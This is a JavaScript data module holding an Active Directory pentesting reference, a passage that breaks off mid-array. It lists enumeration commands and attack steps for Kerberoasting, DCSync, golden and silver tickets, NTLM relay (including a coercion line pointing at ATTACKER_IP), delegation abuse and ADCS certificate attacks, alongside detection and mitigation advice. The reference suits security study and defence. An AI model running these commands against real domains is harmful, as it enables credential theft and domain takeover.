"use strict";
// Active Directory attack reference — enumeration techniques, attack paths, persistence
// mechanisms, tooling, BloodHound queries, and hardening recommendations. Pure data
// module: no side effects, no network calls, no filesystem access. Consumed by the
// Nexus CLI security-knowledge subsystem for offline AD pentesting guidance.

// ---------------------------------------------------------------------------
// 1. AD_ENUMERATION — 30 enumeration techniques
// ---------------------------------------------------------------------------

const AD_ENUMERATION = [
  {
    name: "Domain Information",
    description: "Retrieve basic domain information including domain name, domain SID, domain functional level, forest name, and domain controllers.",
    command: "Get-ADDomain | Select-Object Name, DomainSID, DomainMode, Forest, PDCEmulator, RIDMaster, InfrastructureMaster",
    tool: "PowerView / ActiveDirectory module",
    output: "Domain name, SID, functional level, FSMO role holders, child domains, linked GPOs"
  },
  {
    name: "Forest Information",
    description: "Enumerate the Active Directory forest structure including all domains, trust relationships, global catalog servers, and forest-wide settings.",
    command: "Get-ADForest | Select-Object Name, ForestMode, Domains, GlobalCatalogs, SchemaMaster, DomainNamingMaster",
    tool: "PowerView / ActiveDirectory module",
    output: "Forest name, functional level, all domains in forest, GC servers, schema/domain naming masters"
  },
  {
    name: "Domain Controllers",
    description: "Identify all domain controllers in the current domain, their IP addresses, OS versions, and FSMO roles. Critical for targeting replication attacks.",
    command: "Get-ADDomainController -Filter * | Select-Object Hostname, IPv4Address, OperatingSystem, OperationMasterRoles, IsGlobalCatalog",
    tool: "ActiveDirectory module / nltest /dclist:domain.local",
    output: "DC hostnames, IPs, OS versions, GC status, FSMO roles"
  },
  {
    name: "Domain Users",
    description: "Enumerate all user accounts in the domain including service accounts, disabled accounts, and accounts with special privileges.",
    command: "Get-DomainUser -Properties samaccountname, description, memberof, admincount, lastlogon, pwdlastset, serviceprincipalname | Export-Csv users.csv",
    tool: "PowerView (Get-DomainUser) / net user /domain",
    output: "Username, description, group memberships, admin count flag, last logon, password age, SPNs"
  },
  {
    name: "Privileged Users",
    description: "Identify high-value targets: Domain Admins, Enterprise Admins, Schema Admins, Administrators, Account Operators, Backup Operators, and other privileged groups.",
    command: "Get-DomainGroupMember -Identity 'Domain Admins' -Recurse | Select-Object MemberName, MemberDomain, MemberSID",
    tool: "PowerView / net group \"Domain Admins\" /domain",
    output: "Members of privileged groups including nested membership, SIDs, and domains"
  },
  {
    name: "Domain Groups",
    description: "List all domain groups with their members, descriptions, and scopes. Focus on security groups that control access to sensitive resources.",
    command: "Get-DomainGroup -Properties samaccountname, description, member, admincount, grouptype | Sort-Object admincount -Descending",
    tool: "PowerView / Get-ADGroup -Filter *",
    output: "Group names, descriptions, member counts, admin count flag, group type/scope"
  },
  {
    name: "Domain Computers",
    description: "Enumerate all computer accounts to identify servers, workstations, and their operating systems. Useful for finding unpatched or legacy systems.",
    command: "Get-DomainComputer -Properties dnshostname, operatingsystem, operatingsystemversion, lastlogontimestamp | Sort-Object operatingsystem",
    tool: "PowerView / Get-ADComputer -Filter * -Properties *",
    output: "Hostnames, OS types, OS versions, last logon timestamps, enabled/disabled status"
  },
  {
    name: "Group Policy Objects",
    description: "Enumerate all GPOs and their links, permissions, and settings. GPOs can reveal security configurations, deployed software, and potential misconfigurations.",
    command: "Get-DomainGPO -Properties displayname, gpcfilesyspath, objectguid | ForEach-Object { Get-DomainGPOLocalGroup -GPOGUID $_.objectguid }",
    tool: "PowerView / Get-GPO -All / gpresult /r",
    output: "GPO names, GUIDs, file paths, linked OUs, applied settings, restricted groups"
  },
  {
    name: "GPO Applied Settings",
    description: "Retrieve the resultant set of policy (RSoP) for the current user or a target computer. Reveals effective security settings, software restrictions, and scripts.",
    command: "gpresult /r /scope:computer && gpresult /r /scope:user",
    tool: "gpresult / Get-GPResultantSetOfPolicy",
    output: "Applied GPOs, security settings, software installation policies, logon scripts"
  },
  {
    name: "Access Control Lists",
    description: "Enumerate DACLs on AD objects to find misconfigured permissions that allow privilege escalation. Focus on GenericAll, WriteDacl, WriteOwner, and extended rights.",
    command: "Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner|GenericWrite|WriteProperty' }",
    tool: "PowerView (Find-InterestingDomainAcl) / SharpHound ACL collection",
    output: "Object DN, identity reference, AD rights, access control type, inherited flag"
  },
  {
    name: "Domain Trusts",
    description: "Map trust relationships between domains and forests. Trusts can be exploited for lateral movement and privilege escalation across domain boundaries.",
    command: "Get-DomainTrust | Select-Object SourceName, TargetName, TrustDirection, TrustType, TrustAttributes",
    tool: "PowerView / nltest /domain_trusts / Get-ADTrust -Filter *",
    output: "Source/target domains, trust direction (inbound/outbound/bidirectional), trust type, SID filtering status"
  },
  {
    name: "Service Principal Names",
    description: "Enumerate SPNs registered in the domain to identify service accounts. Accounts with SPNs are targets for Kerberoasting attacks.",
    command: "Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, description, memberof, pwdlastset",
    tool: "PowerView / setspn -Q */* / GetUserSPNs.py",
    output: "Username, SPN values, account descriptions, group memberships, password age"
  },
  {
    name: "Network Shares",
    description: "Discover accessible network shares across the domain. Shares can contain sensitive data, credentials, scripts, and configuration files.",
    command: "Find-DomainShare -CheckShareAccess | Select-Object Name, Type, Remark, ComputerName, Path",
    tool: "PowerView / CrackMapExec smb --shares / smbclient -L",
    output: "Share names, types, comments, host, path, and current user access level"
  },
  {
    name: "Active Sessions",
    description: "Identify where users are currently logged in. Useful for locating Domain Admin sessions for credential theft or token impersonation.",
    command: "Get-NetSession -ComputerName dc01 | Select-Object CName, UserName, Time, IdleTime",
    tool: "PowerView (Get-NetSession) / NetSessionEnum / PsLoggedOn",
    output: "Source IP, username, session duration, idle time"
  },
  {
    name: "Logged-On Users",
    description: "Enumerate users currently logged into specific machines. Combines multiple techniques: remote registry, NetWkstaUserEnum, and WMI queries.",
    command: "Get-NetLoggedon -ComputerName target | Select-Object UserName, LogonDomain, AuthDomains, LogonType",
    tool: "PowerView / CrackMapExec --loggedon-users / quser /server:target",
    output: "Logged-on usernames, logon domains, logon types, session IDs"
  },
  {
    name: "Organizational Units",
    description: "Map the OU structure to understand the organization's hierarchy, delegation model, and where GPOs are applied.",
    command: "Get-DomainOU -Properties name, distinguishedname, gplink, description | Sort-Object distinguishedname",
    tool: "PowerView / Get-ADOrganizationalUnit -Filter *",
    output: "OU names, distinguished names, linked GPOs, descriptions, child objects"
  },
  {
    name: "LAPS Passwords",
    description: "Attempt to read Local Administrator Password Solution (LAPS) attributes. If the current user has read access, plaintext local admin passwords are exposed.",
    command: "Get-DomainComputer -Properties ms-mcs-admpwd, ms-mcs-admpwdexpirationtime, dnshostname | Where-Object { $_.'ms-mcs-admpwd' -ne $null }",
    tool: "PowerView / LAPSToolkit / Get-LAPSPasswords",
    output: "Computer hostname, local admin password (plaintext), password expiration date"
  },
  {
    name: "Kerberos Delegation",
    description: "Find accounts and computers configured for Kerberos delegation: unconstrained, constrained, and resource-based constrained delegation.",
    command: "Get-DomainComputer -Unconstrained | Select-Object dnshostname, useraccountcontrol; Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto",
    tool: "PowerView / Get-ADComputer -Filter {TrustedForDelegation -eq $true}",
    output: "Accounts/computers with delegation, delegation type, allowed delegate-to services"
  },
  {
    name: "AS-REP Roastable Accounts",
    description: "Find accounts that do not require Kerberos pre-authentication. These accounts are vulnerable to offline password cracking via AS-REP roasting.",
    command: "Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, description, memberof, pwdlastset",
    tool: "PowerView / GetNPUsers.py / Rubeus asreproast",
    output: "Usernames without pre-auth, descriptions, group memberships, password age"
  },
  {
    name: "DNS Records",
    description: "Enumerate DNS records from Active Directory-integrated DNS zones. Can reveal hidden hosts, service locations, and network segmentation.",
    command: "Get-DomainDNSRecord -ZoneName domain.local | Select-Object name, type, data",
    tool: "PowerView / dnscmd /enumrecords / adidnsdump",
    output: "DNS record names, types (A, AAAA, CNAME, SRV, MX), and data values"
  },
  {
    name: "ADCS Certificate Templates",
    description: "Enumerate Active Directory Certificate Services templates for misconfigured templates that allow privilege escalation (ESC1-ESC8).",
    command: "certutil -v -template | findstr /i \"Template\\[\\|msPKI-Certificate-Name-Flag\\|msPKI-Enrollment-Flag\\|pKIExtendedKeyUsage\"",
    tool: "Certipy find / Certify.exe find / certutil",
    output: "Template names, enrollment permissions, name flags (ENROLLEE_SUPPLIES_SUBJECT), EKU values"
  },
  {
    name: "Certificate Authorities",
    description: "Identify Enterprise and Standalone CAs in the domain, their configurations, and permissions. CAs are high-value targets for domain persistence.",
    command: "certutil -config - -ping && certutil -catemplates",
    tool: "Certipy find -vulnerable / Certify.exe cas",
    output: "CA names, CA hostnames, certificate templates available, CA permissions, web enrollment status"
  },
  {
    name: "AdminSDHolder Protected Objects",
    description: "Enumerate objects protected by AdminSDHolder's SDProp process. These objects have their ACLs reset every 60 minutes to match AdminSDHolder.",
    command: "Get-DomainObject -SearchBase 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -Properties ntsecuritydescriptor | Select-Object -ExpandProperty ntsecuritydescriptor | Select-Object -ExpandProperty Access",
    tool: "PowerView / Get-ADObject with -SearchBase",
    output: "ACE entries on AdminSDHolder, identity references, access rights, inheritance flags"
  },
  {
    name: "Password Policy",
    description: "Retrieve domain password policy and fine-grained password policies. Weak policies enable password spraying and credential attacks.",
    command: "Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess; Get-DomainFineGrainedPasswordPolicy",
    tool: "PowerView / net accounts /domain / Get-ADDefaultDomainPasswordPolicy",
    output: "Min/max password age, min length, complexity requirement, lockout threshold/duration, FGPP settings"
  },
  {
    name: "Machine Account Quota",
    description: "Check the ms-DS-MachineAccountQuota attribute. If non-zero, any authenticated user can add computer accounts to the domain for RBCD attacks.",
    command: "Get-DomainObject -Identity 'DC=domain,DC=local' -Properties ms-ds-machineaccountquota | Select-Object ms-ds-machineaccountquota",
    tool: "PowerView / Get-ADObject -Identity (Get-ADDomain).DistinguishedName -Properties ms-DS-MachineAccountQuota",
    output: "Machine account quota value (default 10), determines if RBCD via computer account creation is possible"
  },
  {
    name: "SCCM/MECM Servers",
    description: "Locate System Center Configuration Manager (SCCM/MECM) infrastructure in the domain. SCCM has extensive privileges and known attack paths.",
    command: "Get-DomainComputer -SearchBase 'CN=System Management,CN=System,DC=domain,DC=local' | Select-Object dnshostname",
    tool: "SharpSCCM / PowerSCCM / LDAP queries for SCCM SCP",
    output: "SCCM site servers, management points, distribution points, NAA credentials"
  },
  {
    name: "gMSA Passwords",
    description: "Enumerate Group Managed Service Accounts and attempt to read their managed passwords. gMSA passwords are readable by authorized principals.",
    command: "Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)' -Properties samaccountname, msds-groupmsamembership, msds-managedpassword",
    tool: "PowerView / gMSADumper.py / Get-ADServiceAccount -Filter *",
    output: "gMSA account names, authorized principals (PrincipalsAllowedToRetrieveManagedPassword), password blob"
  },
  {
    name: "SID History",
    description: "Find accounts with SID History attributes set. SID History can be abused for privilege escalation across domain trusts.",
    command: "Get-DomainUser -LDAPFilter '(sidhistory=*)' -Properties samaccountname, sidhistory, objectsid",
    tool: "PowerView / Get-ADUser -Filter {SIDHistory -like '*'}",
    output: "Usernames with SID History, original SIDs, current SIDs, potential privilege escalation paths"
  },
  {
    name: "MSSQL Servers",
    description: "Discover Microsoft SQL Server instances registered in the domain via SPNs. MSSQL servers often have linked servers and credential storage.",
    command: "Get-DomainComputer -SearchBase 'DC=domain,DC=local' | Get-DomainSPNTicket -SPN 'MSSQLSvc/*' | Select-Object samaccountname, serviceprincipalname",
    tool: "PowerView / PowerUpSQL (Get-SQLInstanceDomain) / setspn -Q MSSQLSvc/*",
    output: "SQL Server instances, service accounts, version info, linked servers, database access"
  },
  {
    name: "Exchange Servers",
    description: "Identify Exchange servers and their roles. Exchange has extensive AD permissions and known privilege escalation vectors (PrivExchange, ProxyLogon).",
    command: "Get-DomainComputer -SearchBase 'CN=Servers,CN=Exchange Administrative Group,CN=Administrative Groups,CN=ExchangeOrg,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=domain,DC=local'",
    tool: "PowerView / Get-ExchangeServer / LDAP queries",
    output: "Exchange server hostnames, roles (Mailbox/CAS/Hub), versions, OWA URLs"
  }
];

// ---------------------------------------------------------------------------
// 2. AD_ATTACKS — 35 attack techniques
// ---------------------------------------------------------------------------

const AD_ATTACKS = [
  {
    name: "Kerberoasting",
    description: "Request TGS tickets for service accounts with SPNs and crack them offline to recover plaintext passwords. Targets service accounts that often have weak passwords and high privileges.",
    prerequisites: ["Valid domain credentials (any authenticated user)", "Service accounts with registered SPNs"],
    steps: [
      "Enumerate service accounts with SPNs: Get-DomainUser -SPN",
      "Request TGS tickets: Rubeus.exe kerberoast /outfile:hashes.txt",
      "Alternatively use Impacket: GetUserSPNs.py domain/user:password -dc-ip DC_IP -request",
      "Crack the hashes offline: hashcat -m 13100 hashes.txt wordlist.txt",
      "Use the recovered credentials to access services or escalate privileges"
    ],
    tools: ["Rubeus", "Impacket (GetUserSPNs.py)", "PowerView", "hashcat", "John the Ripper"],
    detection: "Monitor for TGS-REQ requests with RC4 encryption (Event ID 4769 with 0x17 encryption type). High volume of service ticket requests from a single account is suspicious. Look for Event ID 4769 where the service name is not krbtgt.",
    mitigation: "Use Group Managed Service Accounts (gMSAs) with automatic password rotation. Set strong passwords (25+ characters) on service accounts. Enable AES encryption and disable RC4 where possible. Implement fine-grained password policies for service accounts."
  },
  {
    name: "AS-REP Roasting",
    description: "Target accounts that do not require Kerberos pre-authentication. Request AS-REP responses and crack the encrypted portion offline to recover passwords.",
    prerequisites: ["Knowledge of accounts with DONT_REQUIRE_PREAUTH flag", "Network access to a domain controller (port 88)"],
    steps: [
      "Enumerate accounts without pre-auth: Get-DomainUser -PreauthNotRequired",
      "Request AS-REP: Rubeus.exe asreproast /outfile:asrep.txt",
      "Alternatively: GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC_IP",
      "Crack the hashes: hashcat -m 18200 asrep.txt wordlist.txt",
      "Use recovered credentials for lateral movement or privilege escalation"
    ],
    tools: ["Rubeus", "Impacket (GetNPUsers.py)", "PowerView", "hashcat"],
    detection: "Monitor Event ID 4768 (TGT requests) without pre-authentication. Look for Kerberos AS-REQ events with pre-auth type 0. Audit accounts with the DONT_REQUIRE_PREAUTH flag.",
    mitigation: "Ensure all accounts require Kerberos pre-authentication. Regularly audit the DONT_REQUIRE_PREAUTH flag. Enforce strong passwords on all accounts. Monitor for changes to userAccountControl attribute."
  },
  {
    name: "Pass-the-Hash (PtH)",
    description: "Authenticate to remote systems using an NTLM hash without knowing the plaintext password. Exploits NTLM authentication protocol's challenge-response mechanism.",
    prerequisites: ["NTLM hash of a user account (obtained via dumping SAM, LSASS, or NTDS.dit)", "Target systems accepting NTLM authentication"],
    steps: [
      "Obtain NTLM hashes: mimikatz sekurlsa::logonpasswords or SAM dump",
      "Use hash for authentication: sekurlsa::pth /user:admin /domain:domain.local /ntlm:HASH /run:cmd",
      "Alternatively: crackmapexec smb targets.txt -u admin -H HASH",
      "Or with Impacket: psexec.py -hashes :HASH domain/admin@target",
      "Execute commands on remote systems using the authenticated session"
    ],
    tools: ["Mimikatz", "CrackMapExec", "Impacket (psexec.py, wmiexec.py, smbexec.py)", "xfreerdp"],
    detection: "Monitor Event ID 4624 (logon type 3 or 9) with NTLM authentication. Look for logon events where the source is unusual for the account. Detect NTLM usage where Kerberos would be expected.",
    mitigation: "Implement Credential Guard on Windows 10/Server 2016+. Restrict NTLM authentication via GPO. Use Protected Users group for privileged accounts. Enable LSA protection (RunAsPPL). Deploy local admin password randomization (LAPS)."
  },
  {
    name: "Pass-the-Ticket (PtT)",
    description: "Inject a stolen Kerberos ticket (TGT or TGS) into the current session to impersonate another user. Does not require the user's password or hash.",
    prerequisites: ["Stolen Kerberos ticket (.kirbi or .ccache file)", "Access to a domain-joined machine"],
    steps: [
      "Export tickets from memory: mimikatz sekurlsa::tickets /export",
      "Alternatively: Rubeus.exe dump /luid:0x12345 /service:krbtgt",
      "Inject the ticket: mimikatz kerberos::ptt ticket.kirbi",
      "Or: Rubeus.exe ptt /ticket:base64_ticket",
      "On Linux: export KRB5CCNAME=ticket.ccache && impacket-psexec -k target",
      "Verify: klist (should show the injected ticket)"
    ],
    tools: ["Mimikatz", "Rubeus", "Impacket", "Kekeo"],
    detection: "Monitor for ticket injection anomalies: Event ID 4768/4769 with unusual client addresses. Detect TGT usage from IPs that differ from the original authentication IP. Look for multiple authentications from different hosts with the same ticket.",
    mitigation: "Implement Credential Guard. Limit ticket lifetimes. Monitor for anomalous Kerberos activity. Use Protected Users group. Regularly rotate the krbtgt password."
  },
  {
    name: "Overpass-the-Hash (Pass-the-Key)",
    description: "Use an NTLM hash or AES key to request a Kerberos TGT, then use Kerberos authentication instead of NTLM. Bypasses NTLM-specific detections while using stolen credentials.",
    prerequisites: ["NTLM hash or AES256/AES128 key of a user account", "Network access to a domain controller (port 88)"],
    steps: [
      "Obtain keys: mimikatz sekurlsa::ekeys (dumps AES keys and NTLM hashes)",
      "Request TGT with NTLM hash: Rubeus.exe asktgt /user:admin /rc4:HASH /ptt",
      "Request TGT with AES key: Rubeus.exe asktgt /user:admin /aes256:KEY /ptt /opsec",
      "With Impacket: getTGT.py domain/admin -hashes :HASH -dc-ip DC_IP",
      "Authenticate using the Kerberos ticket for lateral movement"
    ],
    tools: ["Rubeus", "Mimikatz", "Impacket (getTGT.py)", "Kekeo"],
    detection: "Monitor Event ID 4768 for TGT requests using RC4 encryption (downgrade indicator). Correlate with process creation events. Detect AES key usage from unexpected sources.",
    mitigation: "Enable AES-only Kerberos encryption. Monitor for RC4 TGT requests. Implement Credential Guard. Use Protected Users group (forces AES and disables NTLM)."
  },
  {
    name: "DCSync",
    description: "Simulate domain controller replication to extract password hashes from the domain controller. Requires DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights.",
    prerequisites: ["Account with replication rights (Domain Admins, Enterprise Admins, or delegated)", "Network access to a domain controller (port 135/445)"],
    steps: [
      "Verify replication rights: Get-DomainObjectAcl -Identity 'DC=domain,DC=local' -ResolveGUIDs | Where-Object { $_.ObjectAceType -match 'replication' }",
      "DCSync a specific user: mimikatz lsadump::dcsync /domain:domain.local /user:krbtgt",
      "DCSync all accounts: mimikatz lsadump::dcsync /domain:domain.local /all /csv",
      "With Impacket: secretsdump.py domain/admin:password@DC_IP -just-dc",
      "Extract krbtgt hash for Golden Ticket creation"
    ],
    tools: ["Mimikatz", "Impacket (secretsdump.py)", "SharpKatz", "DSInternals"],
    detection: "Monitor Event ID 4662 with GetChanges/GetChangesAll GUIDs (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 and 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2). Alert on DRS replication from non-DC IP addresses. Monitor for Directory Service Access events.",
    mitigation: "Limit accounts with replication rights to actual domain controllers. Monitor and alert on replication requests from non-DC sources. Implement tiered administration model. Regularly audit replication ACLs."
  },
  {
    name: "Golden Ticket",
    description: "Forge a Kerberos TGT using the krbtgt account's NTLM hash or AES key. Provides unlimited domain access for the lifetime of the krbtgt key (until rotated twice).",
    prerequisites: ["krbtgt account NTLM hash or AES key (obtained via DCSync)", "Domain SID", "Domain name"],
    steps: [
      "Obtain krbtgt hash: mimikatz lsadump::dcsync /domain:domain.local /user:krbtgt",
      "Get domain SID: Get-DomainSID or whoami /user",
      "Create golden ticket: mimikatz kerberos::golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /ptt",
      "With Rubeus: Rubeus.exe golden /rc4:HASH /user:fakeadmin /domain:domain.local /sid:S-1-5-21-xxx /ptt",
      "With Impacket: ticketer.py -nthash HASH -domain-sid S-1-5-21-xxx -domain domain.local fakeadmin",
      "Access any resource in the domain with the forged ticket"
    ],
    tools: ["Mimikatz", "Rubeus", "Impacket (ticketer.py)", "Kekeo"],
    detection: "Detect TGTs with abnormally long lifetimes. Monitor for Event ID 4769 where the account name does not exist in AD. Look for tickets with SID History or group memberships that differ from AD. Anomaly detection on Kerberos traffic patterns.",
    mitigation: "Rotate the krbtgt password twice (the second rotation invalidates all existing tickets). Implement Privileged Access Workstations (PAWs). Monitor for suspicious TGT usage. Reduce krbtgt exposure through tiered administration."
  },
  {
    name: "Silver Ticket",
    description: "Forge a Kerberos TGS ticket for a specific service using the service account's NTLM hash. Provides access to that service without contacting the KDC.",
    prerequisites: ["NTLM hash of the service account (or computer account for host-based services)", "Service SPN", "Domain SID"],
    steps: [
      "Obtain service account hash via Kerberoasting, DCSync, or LSASS dump",
      "Create silver ticket: mimikatz kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:HASH /ptt",
      "For MSSQL: /service:MSSQLSvc /target:sql.domain.local:1433",
      "For HTTP/WinRM: /service:http /target:server.domain.local",
      "Access the targeted service with the forged ticket"
    ],
    tools: ["Mimikatz", "Rubeus", "Impacket (ticketer.py)"],
    detection: "Silver tickets bypass the KDC, so no Event ID 4768 is generated. Monitor for Event ID 4624/4634 logon events without corresponding 4768 events. Enable Kerberos service ticket validation (PAC validation). Use honey tokens.",
    mitigation: "Enable PAC validation on services. Rotate service account passwords regularly. Use gMSAs for service accounts. Monitor for logon events without preceding TGT requests."
  },
  {
    name: "NTLM Relay",
    description: "Intercept NTLM authentication and relay it to another service to gain unauthorized access. Exploits the lack of mutual authentication in NTLM.",
    prerequisites: ["Man-in-the-middle position (ARP spoofing, LLMNR/NBT-NS poisoning)", "Target services without SMB signing or EPA"],
    steps: [
      "Start Responder to capture NTLM hashes: responder -I eth0 -wrfv",
      "Start ntlmrelayx to relay: ntlmrelayx.py -tf targets.txt -smb2support",
      "For LDAP relay (ACL abuse): ntlmrelayx.py -t ldap://DC_IP --escalate-user attacker",
      "For ADCS relay (ESC8): ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
      "Trigger authentication using PetitPotam, PrinterBug, or DFSCoerce",
      "Collect results: SMB shells, LDAP modifications, certificates"
    ],
    tools: ["Impacket (ntlmrelayx.py)", "Responder", "mitm6", "PetitPotam", "PrinterBug", "DFSCoerce"],
    detection: "Monitor for LLMNR/NBT-NS traffic. Detect NTLM authentications to unexpected services. Alert on LDAP modifications from non-admin accounts. Monitor for certificate requests from unusual sources.",
    mitigation: "Enable SMB signing on all systems. Disable LLMNR and NBT-NS via GPO. Enable LDAP signing and channel binding. Disable NTLM where possible. Enable Extended Protection for Authentication (EPA) on web services. Disable web enrollment on ADCS."
  },
  {
    name: "Unconstrained Delegation Abuse",
    description: "Compromise a server with unconstrained delegation to capture TGTs of authenticating users (including machine accounts). Combine with printer bug for DC compromise.",
    prerequisites: ["Compromise of a server with unconstrained delegation (TrustedForDelegation flag)", "Ability to coerce authentication from a target"],
    steps: [
      "Identify unconstrained delegation servers: Get-DomainComputer -Unconstrained",
      "Start monitoring for TGTs: Rubeus.exe monitor /interval:5 /nowrap",
      "Coerce DC authentication using PrinterBug: SpoolSample.exe DC_IP COMPROMISED_SERVER",
      "Or use PetitPotam: PetitPotam.py COMPROMISED_SERVER DC_IP",
      "Capture the DC machine account TGT from Rubeus monitor",
      "Inject the TGT and DCSync: Rubeus.exe ptt /ticket:DC_TGT && mimikatz lsadump::dcsync /domain:domain.local /user:krbtgt"
    ],
    tools: ["Rubeus", "SpoolSample", "PetitPotam", "Mimikatz", "PowerView"],
    detection: "Monitor Event ID 4624 for delegation logon events. Detect TGT forwarding to non-DC machines. Alert on DCSync from non-DC IP addresses. Monitor for print spooler RPC calls.",
    mitigation: "Remove unconstrained delegation where possible. Use constrained or resource-based constrained delegation instead. Add sensitive accounts to 'Protected Users' group. Disable print spooler on domain controllers. Monitor delegation configurations."
  },
  {
    name: "Constrained Delegation Abuse",
    description: "Abuse constrained delegation to impersonate any user to the allowed services. Combine with S4U2Self and S4U2Proxy extensions for full exploitation.",
    prerequisites: ["Compromise of an account with constrained delegation (msDS-AllowedToDelegateTo set)", "Account credentials or TGT"],
    steps: [
      "Identify constrained delegation: Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto",
      "Request TGT for the delegation account: Rubeus.exe asktgt /user:svc_account /rc4:HASH",
      "Perform S4U2Self + S4U2Proxy: Rubeus.exe s4u /ticket:TGT /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt",
      "If alternate service needed: /altservice:ldap,host,http",
      "Access the target service as the impersonated user"
    ],
    tools: ["Rubeus", "Impacket (getST.py)", "Kekeo"],
    detection: "Monitor Event ID 4769 for S4U2Proxy requests. Detect service ticket requests with constrained delegation. Alert on impersonation of privileged accounts through delegation.",
    mitigation: "Minimize constrained delegation usage. Add privileged accounts to 'Protected Users' group (blocks delegation). Set 'Account is sensitive and cannot be delegated' flag on admin accounts. Monitor msDS-AllowedToDelegateTo changes."
  },
  {
    name: "Resource-Based Constrained Delegation (RBCD)",
    description: "Modify msDS-AllowedToActOnBehalfOfOtherIdentity on a target computer to allow a controlled account to impersonate any user to that target.",
    prerequisites: ["Write access to a computer object's msDS-AllowedToActOnBehalfOfOtherIdentity attribute", "Control of another computer/service account (or ability to create one via MachineAccountQuota)"],
    steps: [
      "Create a computer account: addcomputer.py -computer-name FAKE$ -computer-pass Password123 domain/user:pass -dc-ip DC_IP",
      "Set RBCD on target: Set-DomainObject -Identity TARGET$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=(Get-DomainComputer FAKE$).objectsid}",
      "Get hash of fake computer: Rubeus.exe hash /password:Password123 /user:FAKE$ /domain:domain.local",
      "Perform S4U attack: getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/FAKE$:Password123 -dc-ip DC_IP",
      "Use the ticket: export KRB5CCNAME=administrator.ccache && psexec.py -k -no-pass target.domain.local"
    ],
    tools: ["Impacket (addcomputer.py, getST.py)", "Rubeus", "PowerView", "StandIn"],
    detection: "Monitor changes to msDS-AllowedToActOnBehalfOfOtherIdentity attribute. Alert on new computer account creation. Detect S4U2Proxy requests from recently created accounts. Monitor MachineAccountQuota usage.",
    mitigation: "Set MachineAccountQuota to 0. Monitor and restrict write access to computer objects. Audit msDS-AllowedToActOnBehalfOfOtherIdentity changes. Implement tiered administration."
  },
  {
    name: "ADCS ESC1 - Misconfigured Certificate Template",
    description: "Exploit a certificate template that allows enrollee to supply a Subject Alternative Name (SAN), enabling impersonation of any domain user including Domain Admins.",
    prerequisites: ["Enrollment rights on a vulnerable template", "Template with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT and Client Authentication EKU"],
    steps: [
      "Enumerate vulnerable templates: certipy find -vulnerable -u user@domain.local -p password -dc-ip DC_IP",
      "Request certificate with SAN: certipy req -u user@domain.local -p password -ca CA-NAME -target CA_HOST -template VulnTemplate -upn administrator@domain.local",
      "Authenticate with the certificate: certipy auth -pfx administrator.pfx -dc-ip DC_IP",
      "Obtain NT hash from PKINIT: certipy auth -pfx administrator.pfx -dc-ip DC_IP (returns NTLM hash)",
      "Use the hash for DCSync or pass-the-hash"
    ],
    tools: ["Certipy", "Certify.exe", "ForgeCert", "Rubeus"],
    detection: "Monitor Event ID 4886/4887 (certificate requests and issuance). Alert on certificate requests with SANs different from the requestor. Monitor for PKINIT authentication from unexpected certificates.",
    mitigation: "Remove ENROLLEE_SUPPLIES_SUBJECT flag from templates unless absolutely required. Require CA manager approval for SAN templates. Audit certificate template permissions. Restrict enrollment to specific security groups."
  },
  {
    name: "ADCS ESC4 - Vulnerable Certificate Template ACLs",
    description: "Modify a certificate template's configuration by abusing write access to the template object, then exploit the modified template for privilege escalation.",
    prerequisites: ["Write access (WriteDacl, WriteProperty, or Owner) to a certificate template object"],
    steps: [
      "Identify templates with misconfigured ACLs: certipy find -vulnerable -u user@domain.local -p password",
      "Modify the template to enable ESC1: certipy template -u user@domain.local -p password -template TargetTemplate -save-old",
      "Set ENROLLEE_SUPPLIES_SUBJECT flag and Client Authentication EKU",
      "Request certificate exploiting the modified template (ESC1 technique)",
      "Restore original template configuration: certipy template -u user@domain.local -p password -template TargetTemplate -configuration old.json"
    ],
    tools: ["Certipy", "Certify.exe", "PowerView", "ADSI Edit"],
    detection: "Monitor changes to certificate template objects in AD (Event ID 4899). Alert on modifications to msPKI-Certificate-Name-Flag and pKIExtendedKeyUsage attributes. Audit template ACLs regularly.",
    mitigation: "Restrict write access to certificate template objects. Implement change monitoring on template attributes. Use least privilege for template management. Regular ACL audits on PKI objects."
  },
  {
    name: "ADCS ESC8 - NTLM Relay to Web Enrollment",
    description: "Relay NTLM authentication to the ADCS web enrollment endpoint to obtain a certificate for the relayed user, typically a domain controller machine account.",
    prerequisites: ["ADCS web enrollment enabled (HTTP endpoint)", "Ability to coerce NTLM authentication from a target", "No EPA/HTTPS requirement on enrollment endpoint"],
    steps: [
      "Set up NTLM relay to ADCS: ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
      "Coerce DC authentication: PetitPotam.py ATTACKER_IP DC_IP",
      "ntlmrelayx captures and relays the DC machine account auth to ADCS",
      "Obtain the DC machine account certificate (base64)",
      "Authenticate with certificate: Rubeus.exe asktgt /user:DC$ /certificate:cert.pfx /ptt",
      "DCSync using the DC machine account context"
    ],
    tools: ["Impacket (ntlmrelayx.py)", "PetitPotam", "Certipy", "Rubeus"],
    detection: "Monitor for certificate requests from unexpected IP addresses. Detect NTLM relay to HTTP services. Alert on certificate enrollment for DC machine accounts from non-DC sources. Monitor Event ID 4886.",
    mitigation: "Disable HTTP enrollment; require HTTPS with EPA. Enable LDAP signing and channel binding. Disable NTLM on CA servers. Restrict enrollment to appropriate principals. Apply KB5005413 patches."
